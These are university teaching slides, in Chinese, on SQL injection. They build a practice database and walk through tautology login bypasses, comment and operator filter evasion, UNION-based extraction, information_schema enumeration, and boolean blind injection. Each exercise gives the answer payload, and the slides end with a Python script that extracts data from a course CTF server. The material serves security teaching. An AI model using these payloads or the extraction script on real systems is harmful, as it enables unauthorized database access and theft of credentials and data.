---
title: 107 SQL Injection
tags: 大學 , 助教 , 安全程式
---


# SQL Injection

---

## 這啥

---

一種故意塞奇怪的內容讓別人的程式講錯話的手法

---



當某些常用有特殊意義的字詞

混進句子裡的時候會造成的誤解

---

尤其是當你直接把別人給的資料

無條件加進 SQL query 的時候

---

準備一下 db

---

[參照上次講義架起php](https://hackmd.io/p/rJLq8XbR7#/)

---

建立簡單帳號密碼資料庫
```sql=
CREATE DATABASE `FCU`;
use FCU;
CREATE TABLE `Users` (id VARCHAR(10),user VARCHAR(10), password VARCHAR(255));
INSERT INTO Users (id,user,password)
      VALUES ( "1","admin", "4a4be40c96ac6314e91d93f38043a634X" );
```

---

今天
好比說你要登入

你輸入了 帳號: admin 密碼: meow

假設拼出來的 SQL 指令長這樣

```sql
SELECT * from Users
  where user = 'admin' and password = md5('meow');
```

---

密碼不對啥都沒有

![空空der](https://i.imgur.com/WOeMBJM.png)

---

字串是用單引號包的呢

那在參數裡加個 `'` 好了

帳號: `admin'` 密碼: meow

```sql
SELECT * from Users
  where user = 'admin'' and password = md5('meow');
```

---

上色爆炸啦

這行拿去跑會噴錯誤

![語法錯誤](https://i.imgur.com/nIMeDb6.png)

---

那如果說我們故意把他湊成有意義的呢

---

帳號: `admin' or 1=1#'` 密碼: meow

```sql
SELECT * from Users
  where user = 'admin' or 1=1#'' and password = md5('meow');
```

> 上面那個是語法 highlight 的問題 `#` 後面應該會是註解色

---

OOPS

![滑進去](https://i.imgur.com/QT9mOZK.png)

---

這是最基本的邏輯注入

讓他倒出全部的資料

然後也因為有選出東西，所以就可以跳過登入了

---

打打看

<http://140.134.25.138:10013/login.php>

----

解答:
`admin' or 1 = 1;#`

---

有時候開發者會出於安全性(但是偷懶)

只去過濾掉一些關鍵字

---

一些同義詞語法

- 空白
  - `/* 註解 */`
- true
  - `87=87`
- false
  - `1=0`
- and
  - `&&`
- or
  - `||`

---

打打看

<http://140.134.25.138:10019/>

----

`admin'/**/or/**/1/**/=/**/1;#`

---

在試試一題

---

打打看

<http://140.134.25.138:10020/>

----

`admin\' or 1 = 1;#`

---

單純邏輯繞過似乎不太夠

來把其他地方的東西摸出來好了 🤔

---

`UNION SELECT`

把後面的結果接到前面結果的後面

不過要注意結果的欄位數要一致

---

這個會錯

```sql
select 1,2,3 union select 4,5;
```

![碰](https://i.imgur.com/cPRt4rl.png)

---

這個會動

```sql
select 1,2,3 union select 7,8,9;
```

![其實沒啥意義](https://i.imgur.com/tku7CeK.png)

---

還可以這樣

```sql
select 1,2,3 union select 4,5,6 union select 7,8,9;
```

![串](https://i.imgur.com/ERu70zh.png)

---

# 建立新表格

```sql=
CREATE TABLE `ctf` (id VARCHAR(10),user VARCHAR(10), password VARCHAR(255));
INSERT INTO ctf (id,user,password)
      VALUES ( "2","user", "meow" );
```


---

```sql
select * from `Users` union select 'a','a',id from `ctf`;
```
union 選擇額外的東西
`a`,`a` 隨意字串(常數)
![一起來](https://i.imgur.com/2dZNfAq.png)

---




變成如果看到清單類型的就可以這樣注注看

然後你可以直接像前面那樣在 select 裡塞值來猜那個 table 有幾格

---

試打

<http://140.134.25.138:10014/>

 目標在一個叫做 `ctf` 的表裡 欄位叫做 `flag`

----

`' union select 'a','a',flag from ctf;`

---


假如這個在注的時候

我不知道 flag在哪個table裡面

我要去哪裡找我的目標嘛

---

其實幾個主流資料庫的設計都有個神奇的地方

會存放所有資料庫/表/欄位的資訊

---

像是 MySQL/MariaDB 在一個叫做 `information_schema` 的資料庫裡

---

裡面有個叫 tables 的表

裡面有兩個會很常用到的欄位

- table_schema
  - 資料庫名稱
- table_name
  - 資料表名稱

---

`select table_name from information_schema.tables where table_schema = 'test';`

像這個就能列出 test 這個資料庫底下所有的表

---

裡面有個叫 columns 的表

裡面有三個會很常用到的欄位

- table_schema
  - 資料庫名稱
- table_name
  - 資料表名稱
- column_name
  - 欄位名稱

---

`select column_name from information_schema.columns where table_schema = 'test' and table_name = 'test';`

像這個就能列出 test 這個資料庫底下的 test 這張表裡面的所有欄位名稱

---

通常會直接使用 columns

反正 tables 有的東西他都有 (以我們的需求來說)

---

你也可以故意讓前一個找不到任何東西

後面接你要找的東西

---

```sql
select * from `Users` where user = 'admin' and password = md5('meow')
 union select 'a','a', schema_name FROM information_schema.schemata limit 3
```

![](https://i.imgur.com/Kl7DyJ0.png)

---

把這行貼到
<http://140.134.25.138:10014/>

`'  union select 'a','a', schema_name FROM information_schema.schemata ;`
![](https://i.imgur.com/fUGtidb.png)


---

然後再貼這行
`'  union select 'a','a', column_name  FROM information_schema.columns WHERE table_name = 'ctf';`
![](https://i.imgur.com/DIb3Auh.png)

---

這樣就可以找到你要找的資料位子

---

最後一個，如果sql注入只知道對或錯
不知道裡面的資料是甚麼怎麼dump出資料

---

 SQL 是允許把一個 query 的結果當成另一個 query 或是函式的參數

---

帳號: `admin' or substring((select password from Users where user = 'admin' limit 1),1,1)='a'#'`

密碼: meow

```sql
SELECT * from Users
  where user = 'admin' or substring(
    (select password from Users where user = 'admin' limit 1)
    ,1,1
  )='a'#'' and password = md5('meow');
```

---


`substring('string', 開始位置, 長度)`

從 'string' 指定的開始位置取長度個字元

---

`substring('admin', 1, 1)`

會得到 'a'

---

如果過了

代表 `admin` 的 `password` 那一欄

第一個字元是 `a` 或 `A`

> SQL 預設編碼是不分大小寫, so ....

---

至於大小寫不分的問題可以用 SQL 內建函式解決

---

`ASCII('string')`

取出 'string' 第一字元並回傳其 ascii 值

---

`ASCII('a')`

回傳 97

---

依照這原理我們可以把所有能用的字元都試過一次

---

```sql
SELECT * from Users
  where user = 'admin' or ASCII(substring(
    (select password from Users where user = 'admin' limit 1)
    ,1,1
  ))=ASCII('a')#'' and password = md5('meow');
```

像這個試完 a 不行 那就換 b

中了就換下個字元

~~有恆心毅力的人可以挑戰手解~~

---

這方法是可以拿來把整個 db 架構掏出來的 (搭配前面的 information_schema)

不過在伺服器的記錄裡面會很顯眼 😅

---

試打

<http://140.134.25.138:10015/>

真心推薦寫腳本

可以用 python


---

一點腳本小 demo

---

對不起我只會寫髒code
```python=
import requests
import string

r = requests.Session()

def get_target(target):
   	
	now_chr = 1
	add_chr = ""
	while True :
		flag = 0
		printable = string.printable
		for chr1 in printable :
			payload = {
				'username': "admin' or substring(("+target+"),"+str(now_chr)+",1)='"+chr1+"';",
				'password': 'd'

			}

			index = r.post('http://140.134.25.138:10015/login.php',data=payload)
			if (index.text.find("Success"))>0:
				add_chr += chr1
				flag = 1
				break
		if chr1 == " " or flag == 0:
			break
		now_chr += 1
	return add_chr
def get_all(target):
	count = 0
	while True:
		a = get_target(target+" LIMIT "+str(count)+",1")
		print(a)
		if a =="":
		    break
		count += 1

print(get_target('database()'))
print("----get all table---")
get_all("select schema_name FROM information_schema.schemata")
print("---get ctf table name---")
get_all("select table_name  FROM information_schema.columns WHERE schema_name = 'ctf'")
print("----get ctf table column_name---")
get_all("select column_name  FROM information_schema.columns WHERE table_name = 'ctf'")
print("---get flag---")
get_all('SELECT flag FROM ctf')
```
